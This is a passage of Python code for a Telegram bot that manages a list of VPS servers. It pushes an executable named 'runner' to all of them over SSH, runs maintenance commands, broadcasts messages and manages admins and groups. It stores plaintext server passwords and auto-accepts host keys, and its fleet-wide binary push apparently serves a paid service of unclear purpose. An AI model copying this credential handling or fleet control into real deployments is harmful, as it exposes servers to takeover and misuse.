    except Exception as e:
        bot.reply_to(message,
            f"╭━━━〔 ❌ 𝗘𝗥𝗥𝗢𝗥 〕━━━╮\n"
            f"│\n"
            f"│ Failed to add VPS:\n"
            f"│ {str(e)}\n"
            f"│\n"
            f"╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")

@bot.message_handler(func=lambda msg: msg.text == "➖ 𝙍𝙀𝙈𝙊𝙑𝙀 𝙑𝙋𝙎")
def remove_vps_start(message):
    """Start VPS removal process with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, 
            "╭━━━〔 ⛔ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗 〕━━━╮\n"
            "│\n"
            "│ Only owner can remove VPS!\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")
        return
    
    if not VPS_LIST:
        bot.reply_to(message, 
            "╭━━━〔 ⚠️ 𝗡𝗢 𝗩𝗣𝗦 〕━━━╮\n"
            "│\n"
            "│ No VPS available to remove!\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")
        return
    
    # Create numbered list of VPS
    vps_list_text = "\n".join(
        f"{i+1}. 𝗜𝗣: `{vps[0]}`, 𝗨𝘀𝗲𝗿: `{vps[1]}`" 
        for i, vps in enumerate(VPS_LIST)
    )
    
    bot.reply_to(message,
        f"╭━━━〔 ➖ 𝗥𝗘𝗠𝗢𝗩𝗘 𝗩𝗣𝗦 〕━━━╮\n"
        f"│\n"
        f"│ Select VPS to remove by number:\n"
        f"│\n"
        f"{vps_list_text}\n"
        f"│\n"
        f"╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯",
        parse_mode="Markdown")
    bot.register_next_step_handler(message, remove_vps_process)

def remove_vps_process(message):
    """Process VPS removal with premium styling"""
    try:
        selection = int(message.text) - 1
        if 0 <= selection < len(VPS_LIST):
            removed_vps = VPS_LIST.pop(selection)
            save_data()
            
            bot.reply_to(message,
                f"╭━━━〔 ✅ 𝗩𝗣𝗦 𝗥𝗘𝗠𝗢𝗩𝗘𝗗 〕━━━╮\n"
                f"│\n"
                f"│ 𝗜𝗣: `{removed_vps[0]}`\n"
                f"│ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: `{removed_vps[1]}`\n"
                f"│\n"
                f"╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯",
                parse_mode="Markdown")
        else:
            raise ValueError("Invalid selection")
    except:
        bot.reply_to(message,
            "╭━━━〔 ❌ 𝗘𝗥𝗥𝗢𝗥 〕━━━╮\n"
            "│\n"
            "│ Please enter a valid number!\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")

@bot.message_handler(func=lambda msg: msg.text == "📤 𝙐𝙋𝙇𝙊𝘼𝘿 𝘽𝙄𝙉𝘼𝙍𝙔")
def upload_binary_start(message):
    """Initiate binary upload process with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, 
            "╭━━━〔 ⛔ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗 〕━━━╮\n"
            "│\n"
            "│ Only owners can upload binaries!\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")
        return

    if not VPS_LIST:
        bot.reply_to(message, 
            "╭━━━〔 ⚠️ 𝗡𝗢 𝗩𝗣𝗦 〕━━━╮\n"
            "│\n"
            "│ No VPS configured in system!\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")
        return

    bot.reply_to(message,
        "╭━━━〔 ⬆️ 𝗨𝗣𝗟𝗢𝗔𝗗 𝗕𝗜𝗡𝗔𝗥𝗬 〕━━━╮\n"
        "│\n"
        "│ 1. Upload your binary file\n"
        "│ 2. Must be named: `runner`\n"
        "│ 3. Will be installed to:\n"
        "│    `/home/master/freeroot/root`\n"
        "│\n"
        "│ ⚠️ 𝗪𝗔𝗥𝗡𝗜𝗡𝗚:\n"
        "│ This will overwrite existing binaries!\n"
        "│\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯",
        parse_mode="Markdown")
    
    bot.register_next_step_handler(message, handle_binary_upload)

def handle_binary_upload(message):
    """Process uploaded binary file with premium styling"""
    if not message.document:
        bot.reply_to(message,
            "╭━━━〔 ❌ 𝗡𝗢 𝗙𝗜𝗟𝗘 〕━━━╮\n"
            "│\n"
            "│ Please upload a binary file!\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")
        return

    file_name = message.document.file_name
    if file_name != BINARY_NAME:
        bot.reply_to(message,
            f"╭━━━〔 ❌ 𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗙𝗜𝗟𝗘 〕━━━╮\n"
            f"│\n"
            f"│ File must be named: `{BINARY_NAME}`\n"
            f"│\n"
            f"╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯",
            parse_mode="Markdown")
        return

    # Download file temporarily
    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    temp_path = f"/tmp/{file_name}"
    
    with open(temp_path, 'wb') as new_file:
        new_file.write(downloaded_file)

    # Start distribution
    msg = bot.reply_to(message,
        "╭━━━〔 ⚡ 𝗗𝗜𝗦𝗧𝗥𝗜𝗕𝗨𝗧𝗜𝗡𝗚 〕━━━╮\n"
        "│\n"
        "│ Uploading binary to all VPS...\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")
    
    success_count = 0
    results = []
    
    for vps in VPS_LIST[:ACTIVE_VPS_COUNT]:  # Only active VPS
        ip, username, password = vps
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=username, password=password, timeout=15)
            
            with SCPClient(ssh.get_transport()) as scp:
                scp.put(temp_path, f"/home/master/freeroot/root/{BINARY_NAME}")
            
            # Make executable
            ssh.exec_command(f"chmod +x /home/master/freeroot/root/{BINARY_NAME}")
            
            # Verify
            stdin, stdout, stderr = ssh.exec_command(f"ls -la /home/master/freeroot/root/{BINARY_NAME}")
            if BINARY_NAME in stdout.read().decode():
                results.append(f"✅ `{ip}` - Success")
                success_count += 1
            else:
                results.append(f"⚠️ `{ip}` - Upload failed")
            
            ssh.close()
        except Exception as e:
            results.append(f"❌ `{ip}` - Error: {str(e)[:50]}...")

    # Cleanup and report
    os.remove(temp_path)
    
    bot.edit_message_text(
        f"╭━━━〔 📊 𝗗𝗜𝗦𝗧𝗥𝗜𝗕𝗨𝗧𝗜𝗢𝗡 𝗥𝗘𝗦𝗨𝗟𝗧𝗦 〕━━━╮\n"
        f"│\n"
        f"│ ✅ Success: {success_count}/{len(VPS_LIST[:ACTIVE_VPS_COUNT])}\n"
        f"│ ❌ Failed: {len(VPS_LIST[:ACTIVE_VPS_COUNT]) - success_count}\n"
        f"│\n"
        f"│ 𝗗𝗲𝘁𝗮𝗶𝗹𝘀:\n" + "\n".join(results) + "\n"
        f"╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯",
        message.chat.id,
        msg.message_id,
        parse_mode="Markdown"
    )

@bot.message_handler(func=lambda msg: msg.text == "🗑️ 𝘿𝙀𝙇𝙀𝙏𝙀 𝘽𝙄𝙉𝘼𝙍𝙔")
def delete_binary_all_vps(message):
    """Delete binary from all VPS servers with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, 
            "╭━━━〔 ⛔ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗 〕━━━╮\n"
            "│\n"
            "│ Only owners can delete binaries!\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")
        return

    if not VPS_LIST:
        bot.reply_to(message, 
            "╭━━━〔 ⚠️ 𝗡𝗢 𝗩𝗣𝗦 〕━━━╮\n"
            "│\n"
            "│ No VPS configured in system!\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")
        return

    # Create confirmation keyboard
    markup = telebot.types.InlineKeyboardMarkup()
    markup.row(
        telebot.types.InlineKeyboardButton("✅ CONFIRM DELETE", callback_data="confirm_binary_delete"),
        telebot.types.InlineKeyboardButton("❌ CANCEL", callback_data="cancel_binary_delete")
    )
    
    bot.reply_to(message,
        "╭━━━〔 ⚠️ 𝗖𝗢𝗡𝗙𝗜𝗥𝗠 𝗗𝗘𝗟𝗘𝗧𝗜𝗢𝗡 〕━━━╮\n"
        "│\n"
        "│ This will delete the binary from:\n"
        "│ ALL {} VPS servers!\n"
        "│\n"
        "│ This action cannot be undone!\n"
        "│\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯".format(len(VPS_LIST)),
        reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "confirm_binary_delete")
def execute_binary_deletion(call):
    """Execute binary deletion after confirmation"""
    msg = bot.edit_message_text(
        "╭━━━〔 ⏳ 𝗗𝗘𝗟𝗘𝗧𝗜𝗡𝗚 〕━━━╮\n"
        "│\n"
        "│ Removing binary from all VPS...\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯",
        call.message.chat.id,
        call.message.message_id
    )

    success, failed, result_lines = 0, 0, []

    for vps in VPS_LIST:
        try:
            ip, username, password = vps
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=username, password=password, timeout=10)

            # Delete binary
            ssh.exec_command(f"rm -f /home/master/freeroot/root/{BINARY_NAME}")
            
            # Verify deletion
            stdin, stdout, stderr = ssh.exec_command(f"ls /home/master/freeroot/root/{BINARY_NAME} 2>/dev/null || echo 'deleted'")
            if "deleted" in stdout.read().decode():
                success += 1
                result_lines.append(f"✅ `{ip}` - Binary deleted")
            else:
                failed += 1
                result_lines.append(f"⚠️ `{ip}` - Deletion failed")
                
            ssh.close()
        except Exception as e:
            failed += 1
            result_lines.append(f"❌ `{ip}` - Error: {str(e)[:50]}...")

    final_msg = (
        f"╭━━━〔 🗑️ 𝗗𝗘𝗟𝗘𝗧𝗜𝗢𝗡 𝗥𝗘𝗣𝗢𝗥𝗧 〕━━━╮\n"
        f"│\n"
        f"│ ✅ Success: {success}\n"
        f"│ ❌ Failed: {failed}\n"
        f"│\n"
        f"│ 𝗗𝗲𝘁𝗮𝗶𝗹𝘀:\n" + "\n".join(result_lines) + "\n"
        f"╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯"
    )

    bot.edit_message_text(final_msg, call.message.chat.id, call.message.message_id, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "cancel_binary_delete")
def cancel_binary_deletion(call):
    """Cancel binary deletion"""
    bot.edit_message_text(
        "╭━━━〔 🚫 𝗖𝗔𝗡𝗖𝗘𝗟𝗘𝗗 〕━━━╮\n"
        "│\n"
        "│ Binary deletion cancelled\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯",
        call.message.chat.id,
        call.message.message_id
    )

@bot.message_handler(func=lambda msg: msg.text == "⚡ 𝘽𝙊𝙊𝙎𝙏 𝙑𝙋𝙎 (𝙎𝘼𝙁𝙀)")
def safe_boost_vps(message):
    """Boost VPS performance without deleting any files with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, 
            "╭━━━〔 ⛔ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗 〕━━━╮\n"
            "│\n"
            "│ Only owner can boost VPS!\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")
        return

    # Send initial message with loading animation
    msg = bot.send_message(message.chat.id, 
        "╭━━━〔 ⚡ 𝗩𝗣𝗦 𝗕𝗢𝗢𝗦𝗧 〕━━━╮\n"
        "│\n"
        "│ Optimizing all VPS servers...\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")
    
    success = 0
    failed = 0
    optimization_details = []

    for vps in VPS_LIST:
        try:
            ip, username, password = vps
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=username, password=password, timeout=15)
            
            # SAFE OPTIMIZATION COMMANDS (NO FILE DELETION)
            commands = [
                # Clear RAM cache (safe)
                "sync; echo 3 > /proc/sys/vm/drop_caches",
                
                # Optimize SWAP
                "swapoff -a && swapon -a",
                
                # Clear DNS cache
                "systemctl restart systemd-resolved 2>/dev/null || service nscd restart 2>/dev/null",
                
                # Kill zombie processes
                "kill -9 $(ps -A -ostat,ppid | awk '/[zZ]/ && !a[$2]++ {print $2}') 2>/dev/null || true",
                
                # Network optimization
                "sysctl -w net.ipv4.tcp_fin_timeout=30",
                "sysctl -w net.ipv4.tcp_tw_reuse=1"
            ]
            
            # Execute all optimization commands
            for cmd in commands:
                ssh.exec_command(cmd)
            
            # Get before/after memory stats
            stdin, stdout, stderr = ssh.exec_command("free -m | awk 'NR==2{printf \"%.2f%%\", $3*100/$2}'")
            mem_usage = stdout.read().decode().strip()
            
            optimization_details.append(f"✅ `{ip}` - Memory: {mem_usage}")
            success += 1
            ssh.close()
            
        except Exception as e:
            failed += 1
            optimization_details.append(f"❌ `{ip}` - Error: {str(e)[:50]}...")
            continue

    # Prepare final report
    report = (
        f"╭━━━〔 📊 𝗕𝗢𝗢𝗦𝗧 𝗥𝗘𝗣𝗢𝗥𝗧 〕━━━╮\n"
        f"│\n"
        f"│ ✅ Success: {success}\n"
        f"│ ❌ Failed: {failed}\n"
        f"│\n"
        f"│ 𝗢𝗽𝘁𝗶𝗺𝗶𝘇𝗮𝘁𝗶𝗼𝗻𝘀 𝗔𝗽𝗽𝗹𝗶𝗲𝗱:\n"
        f"│ • RAM Cache Cleared\n"
        f"│ • SWAP Memory Optimized\n"  
        f"│ • DNS Cache Flushed\n"
        f"│ • Zombie Processes Killed\n"
        f"│ • Network Stack Tuned\n"
        f"│\n"
        f"│ 𝗗𝗲𝘁𝗮𝗶𝗹𝘀:\n" + "\n".join(optimization_details) + "\n"
        f"╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯"
    )

    # Edit the original message with final report
    try:
        bot.edit_message_text(report, message.chat.id, msg.message_id, parse_mode="Markdown")
    except:
        # If message is too long, send as separate messages
        parts = [report[i:i+4000] for i in range(0, len(report), 4000)]
        for part in parts:
            bot.send_message(message.chat.id, part, parse_mode="Markdown")

# ======================
# 📢 BROADCAST SYSTEM (STYLISH VERSION)
# ======================
@bot.message_handler(func=lambda msg: msg.text == "📢 𝘽𝙍𝙊𝘿𝘾𝘼𝙎𝙏")
def send_notice_handler(message):
    """Handle broadcast message initiation with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "🚫 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗", reply_markup=create_main_keyboard(message))
        return

    msg = bot.send_message(message.chat.id, 
        "📢 𝗦𝗘𝗡𝗗 𝗬𝗢𝗨𝗥 𝗡𝗢𝗧𝗜𝗖𝗘 (𝗔𝗡𝗬 𝗢𝗙 𝗧𝗛𝗘𝗦𝗘):\n"
        "• 𝗧𝗲𝘅𝘁 𝗺𝗲𝘀𝘀𝗮𝗴𝗲\n"
        "• 𝗣𝗵𝗼𝘁𝗼 𝘄𝗶𝘁𝗵 𝗰𝗮𝗽𝘁𝗶𝗼𝗻\n" 
        "• 𝗩𝗶𝗱𝗲𝗼 𝘄𝗶𝘁𝗵 𝗰𝗮𝗽𝘁𝗶𝗼𝗻\n"
        "• 𝗙𝗶𝗹𝗲/𝗱𝗼𝗰𝘂𝗺𝗲𝗻𝘁 𝘄𝗶𝘁𝗵 𝗰𝗮𝗽𝘁𝗶𝗼𝗻")
    bot.register_next_step_handler(msg, capture_notice_message)

def capture_notice_message(message):
    """Capture the broadcast message content with premium styling"""
    if message.content_type not in ['text', 'photo', 'video', 'document']:
        bot.reply_to(message, "⚠️ 𝗣𝗟𝗘𝗔𝗦𝗘 𝗦𝗘𝗡𝗗 𝗢𝗡𝗟𝗬:\n𝗧𝗲𝘅𝘁/𝗣𝗵𝗼𝘁𝗼/𝗩𝗶𝗱𝗲𝗼/𝗙𝗶𝗹𝗲")
        return

    notice = {
        "type": message.content_type,
        "content": message.text if message.content_type == 'text' else message.caption,
        "sender": message.from_user.id
    }

    # Handle different attachment types
    if message.content_type == 'photo':
        notice['file_id'] = message.photo[-1].file_id
    elif message.content_type == 'video':
        notice['file_id'] = message.video.file_id
    elif message.content_type == 'document':
        notice['file_id'] = message.document.file_id
        notice['file_name'] = message.document.file_name

    instructor_notices[str(message.from_user.id)] = notice

    markup = telebot.types.InlineKeyboardMarkup()
    markup.row(
        telebot.types.InlineKeyboardButton("✅ 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 𝗡𝗢𝗪", callback_data="broadcast_now"),
        telebot.types.InlineKeyboardButton("❌ 𝗖𝗔𝗡𝗖𝗘𝗟", callback_data="cancel_notice")
    )

    # Create premium preview message
    preview_text = f"""
╭━━━〔 📢 𝗡𝗢𝗧𝗜𝗖𝗘 𝗣𝗥𝗘𝗩𝗜𝗘𝗪 〕━━━╮
┃
┣ 𝗧𝘆𝗽𝗲: {'𝗧𝗘𝗫𝗧' if notice['type'] == 'text' else '𝗣𝗛𝗢𝗧𝗢' if notice['type'] == 'photo' else '𝗩𝗜𝗗𝗘𝗢' if notice['type'] == 'video' else '𝗙𝗜𝗟𝗘'}
┃
"""
    
    if notice['content']:
        preview_text += f"┣ 𝗖𝗼𝗻𝘁𝗲𝗻𝘁: {notice['content']}\n"
    
    if notice['type'] == 'document':
        preview_text += f"┣ 𝗙𝗶𝗹𝗲: {notice['file_name']}\n"

    preview_text += "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯\n"
    preview_text += "\n⚠️ 𝗖𝗢𝗡𝗙𝗜𝗥𝗠 𝗧𝗢 𝗦𝗘𝗡𝗗 𝗧𝗛𝗜𝗦 𝗡𝗢𝗧𝗜𝗖𝗘?"

    bot.send_message(
        message.chat.id,
        preview_text,
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.data in ['broadcast_now', 'cancel_notice'])
def handle_notice_confirmation(call):
    """Handle broadcast confirmation with premium styling"""
    user_id = str(call.from_user.id)
    notice = instructor_notices.get(user_id)
    
    if not notice:
        bot.edit_message_text("⚠️ 𝗡𝗢 𝗡𝗢𝗧𝗜𝗖𝗘 𝗙𝗢𝗨𝗡𝗗 𝗧𝗢 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧", call.message.chat.id, call.message.message_id)
        return

    results = {'success': 0, 'failed': 0}

    def send_notice(chat_id):
        try:
            caption = f"»»—— 𝐀𝐋𝐎𝐍𝐄 ƁƠƳ ♥ OFFICIAL NOTICE \n\n{notice['content']}" if notice['content'] else "---------------------"
            
            if notice['type'] == 'text':
                bot.send_message(chat_id, caption)
            elif notice['type'] == 'photo':
                bot.send_photo(chat_id, notice['file_id'], caption=caption)
            elif notice['type'] == 'video':
                bot.send_video(chat_id, notice['file_id'], caption=caption)
            elif notice['type'] == 'document':
                bot.send_document(chat_id, notice['file_id'], caption=caption)
            results['success'] += 1
        except Exception as e:
            print(f"Error sending notice to {chat_id}: {e}")
            results['failed'] += 1

    bot.edit_message_text("📡 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧𝗜𝗡𝗚 𝗡𝗢𝗧𝗜𝗖𝗘...", call.message.chat.id, call.message.message_id)

    # Send to all users who ever interacted with the bot
    for uid in all_users:
        send_notice(uid)
        time.sleep(0.1)  # Rate limiting

    # Send to all allowed groups
    for gid in ALLOWED_GROUP_IDS:
        send_notice(gid)
        time.sleep(0.2)  # More delay for groups to avoid rate limits

    instructor_notices.pop(user_id, None)

    report = f"""
╭━━━〔 📊 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 𝗥𝗘𝗣𝗢𝗥𝗧 〕━━━╮
┃
┣ ✅ 𝗦𝘂𝗰𝗰𝗲𝘀𝘀: {results['success']}
┣ ❌ 𝗙𝗮𝗶𝗹𝗲𝗱: {results['failed']}
┃
┣ ⏱ {datetime.datetime.now().strftime('%d %b %Y %H:%M:%S')}
┃
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
"""
    bot.send_message(call.message.chat.id, report, reply_markup=create_main_keyboard(call.message))

# ======================
# 👑 ADMIN MANAGEMENT (PREMIUM STYLISH VERSION)
# ======================

@bot.message_handler(func=lambda msg: msg.text == "➕ 𝘼𝘿𝘿 𝘼𝘿𝙈𝙄𝙉")
def start_add_admin(message):
    """Start admin addition process with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, 
            "╭━━━〔 ⛔ 𝗣𝗥𝗜𝗩𝗜𝗟𝗘𝗚𝗘 𝗥𝗘𝗤𝗨𝗜𝗥𝗘𝗗 〕━━━╮\n"
            "│\n"
            "│ Only the Supreme Owner can\n"
            "│ grant admin privileges!\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")
        return
        
    bot.reply_to(message,
        "╭━━━〔 👑 𝗡𝗘𝗪 𝗔𝗗𝗠𝗜𝗡 〕━━━╮\n"
        "│\n"
        "│ Enter the username to elevate:\n"
        "│ (Without @, e.g. GODxAloneBOY)\n"
        "│\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")
    bot.register_next_step_handler(message, process_add_admin)

def process_add_admin(message):
    """Process admin addition with premium styling"""
    username = message.text.strip().lstrip("@")
    
    if not username:
        bot.reply_to(message, 
            "╭━━━〔 ❌ 𝗜𝗡𝗩𝗔𝗟𝗜𝗗 〕━━━╮\n"
            "│\n"
            "│ Please enter a valid username!\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯",
            reply_markup=create_main_keyboard(message))
        return
    
    if username in ADMIN_IDS:
        bot.reply_to(message,
            f"╭━━━〔 ⚠️ 𝗔𝗟𝗥𝗘𝗔𝗗𝗬 𝗔𝗗𝗠𝗜𝗡 〕━━━╯\n"
            f"│\n"
            f"│ @{username} already has\n"
            f"│ administrator privileges!\n"
            f"╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯",
            reply_markup=create_main_keyboard(message))
        return
    
    ADMIN_IDS.append(username)
    save_admins()
    
    bot.reply_to(message,
        f"╭━━━〔 ✅ 𝗘𝗟𝗘𝗩𝗔𝗧𝗘𝗗 〕━━━╮\n"
        f"│\n"
        f"│ @{username} is now an\n"
        f"│ administrator with full\n"
        f"│ control privileges!\n"
        f"│\n"
        f"╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯",
        reply_markup=create_main_keyboard(message))
        
    # Try to notify the new admin
    try:
        bot.send_message(
            username,
            "╭━━━〔 ⚡ 𝗔𝗗𝗠𝗜𝗡 𝗣𝗥𝗜𝗩𝗜𝗟𝗘𝗚𝗘𝗦 〕━━━╮\n"
            "│\n"
            "│ You've been granted admin\n"
            "│ access by the owner!\n"
            "│\n"
            "│ You can now access:\n"
            "│ • Key Management\n"
            "│ • Group Settings\n"
            "│ • Broadcast System\n"
            "│\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯"
        )
    except:
        pass

@bot.message_handler(func=lambda msg: msg.text == "➖ 𝙍𝙀𝙈𝙊𝙑𝙀 𝘼𝘿𝙈𝙄𝙉")
def start_remove_admin(message):
    """Start admin removal process with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, 
            "╭━━━〔 ⛔ 𝗣𝗥𝗜𝗩𝗜𝗟𝗘𝗚𝗘 𝗥𝗘𝗤𝗨𝗜𝗥𝗘𝗗 〕━━━╮\n"
            "│\n"
            "│ Only the Supreme Owner can\n"
            "│ revoke admin privileges!\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")
        return
    
    if len(ADMIN_IDS) <= 1:  # Don't allow removing last admin
        bot.reply_to(message,
            "╭━━━〔 ⚠️ 𝗠𝗜𝗡𝗜𝗠𝗨𝗠 𝗔𝗗𝗠𝗜𝗡𝗦 〕━━━╮\n"
            "│\n"
            "│ System requires at least\n"
            "│ one administrator!\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")
        return
    
    markup = telebot.types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
    for admin in ADMIN_IDS:
        if admin != OWNER_USERNAME:  # Don't show owner in removal list
            markup.add(telebot.types.KeyboardButton(f"👤 @{admin}"))
    markup.add(telebot.types.KeyboardButton("❌ Cancel"))
    
    bot.reply_to(message,
        "╭━━━〔 🗑 𝗥𝗘𝗠𝗢𝗩𝗘 𝗔𝗗𝗠𝗜𝗡 〕━━━╮\n"
        "│\n"
        "│ Select admin to demote:\n"
        "│\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯",
        reply_markup=markup)
    bot.register_next_step_handler(message, process_remove_admin)

def process_remove_admin(message):
    """Process admin removal with premium styling"""
    if message.text == "❌ Cancel":
        bot.reply_to(message,
            "╭━━━〔 🚫 𝗖𝗔𝗡𝗖𝗘𝗟𝗘𝗗 〕━━━╮\n"
            "│\n"
            "│ Admin removal cancelled\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯",
            reply_markup=create_main_keyboard(message))
        return
    
    username = message.text.strip().lstrip("@").lstrip("👤 ")
    
    if username not in ADMIN_IDS:
        bot.reply_to(message,
            "╭━━━〔 ❌ 𝗡𝗢𝗧 𝗙𝗢𝗨𝗡𝗗 〕━━━╮\n"
            "│\n"
            "│ This user isn't an admin!\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯",
            reply_markup=create_main_keyboard(message))
        return
    
    if username == OWNER_USERNAME:
        bot.reply_to(message,
            "╭━━━〔 ⛔ 𝗙𝗢𝗥𝗕𝗜𝗗𝗗𝗘𝗡 〕━━━╮\n"
            "│\n"
            "│ Cannot remove the\n"
            "│ Supreme Owner!\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯",
            reply_markup=create_main_keyboard(message))
        return
    
    ADMIN_IDS.remove(username)
    save_admins()
    
    bot.reply_to(message,
        f"╭━━━〔 ⬇️ 𝗗𝗘𝗠𝗢𝗧𝗘𝗗 〕━━━╮\n"
        f"│\n"
        f"│ @{username} has been\n"
        f"│ removed from administrators!\n"
        f"│\n"
        f"╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯",
        reply_markup=create_main_keyboard(message))
        
    # Try to notify the demoted admin
    try:
        bot.send_message(
            username,
            "╭━━━〔 ⚠️ 𝗣𝗥𝗜𝗩𝗜𝗟𝗘𝗚𝗘𝗦 𝗥𝗘𝗩𝗢𝗞𝗘𝗗 〕━━━╮\n"
            "│\n"
            "│ Your admin access has\n"
            "│ been removed by the owner.\n"
            "│\n"
            "│ Contact @GODxAloneBOY if\n"
            "│ you believe this is a mistake.\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯"
        )
    except:
        pass

@bot.message_handler(func=lambda msg: msg.text == "📋 𝗔𝗗𝗠𝗜𝗡 𝗟𝗜𝗦𝗧")
def show_admin_list(message):
    """Show admin list with premium styling"""
    if not is_admin(message.from_user):
        bot.reply_to(message, 
            "╭━━━〔 ⛔ 𝗣𝗥𝗜𝗩𝗜𝗟𝗘𝗚𝗘 𝗥𝗘𝗤𝗨𝗜𝗥𝗘𝗗 〕━━━╮\n"
            "│\n"
            "│ Only admins can view\n"
            "│ the admin list!\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")
        return
    
    if not ADMIN_IDS:
        bot.reply_to(message,
            "╭━━━〔 ⚠️ 𝗡𝗢 𝗔𝗗𝗠𝗜𝗡𝗦 〕━━━╮\n"
            "│\n"
            "│ No administrators found!\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")
        return
    
    admin_list = []
    for i, admin in enumerate(ADMIN_IDS, 1):
        status = "👑 Supreme Owner" if admin == OWNER_USERNAME else "🛡️ Administrator"
        admin_list.append(f"{i}. @{admin} - {status}")
    
    response = (
        "╭━━━〔 🏆 𝗔𝗗𝗠𝗜𝗡𝗜𝗦𝗧𝗥𝗔𝗧𝗢𝗥𝗦 〕━━━╮\n"
        "│\n"
        f"│ Total Admins: {len(ADMIN_IDS)}\n"
        "│\n"
        f"{chr(10).join(admin_list)}\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯"
    )
    
    bot.reply_to(message, response)

# ======================
# 🏰 GROUP MANAGEMENT (PREMIUM STYLISH VERSION)
# ======================

@bot.message_handler(func=lambda msg: msg.text == "👥 𝘼𝘿𝘿 𝙂𝙍𝙊𝙐𝙋")
def add_group_handler(message):
    """Add a new allowed group with premium styling"""
    if not is_admin(message.from_user):
        bot.reply_to(message, 
            "╭━━━〔 ⛔ 𝗣𝗥𝗜𝗩𝗜𝗟𝗘𝗚𝗘 𝗥𝗘𝗤𝗨𝗜𝗥𝗘𝗗 〕━━━╮\n"
            "│\n"
            "│ Only admins can add\n"
            "│ authorized groups!\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")
        return
    
    bot.reply_to(message,
        "╭━━━〔 🏰 𝗡𝗘𝗪 𝗚𝗥𝗢𝗨𝗣 〕━━━╮\n"
        "│\n"
        "│ Send the GROUP ID to add:\n"
        "│ (Must start with -100)\n"
        "│\n"
        "│ Example: -1001234567890\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")
    bot.register_next_step_handler(message, process_add_group)

def process_add_group(message):
    """Process group addition with premium styling"""
    try:
        group_id = int(message.text.strip())
        
        if group_id >= 0:
            raise ValueError("Group ID must be negative")
            
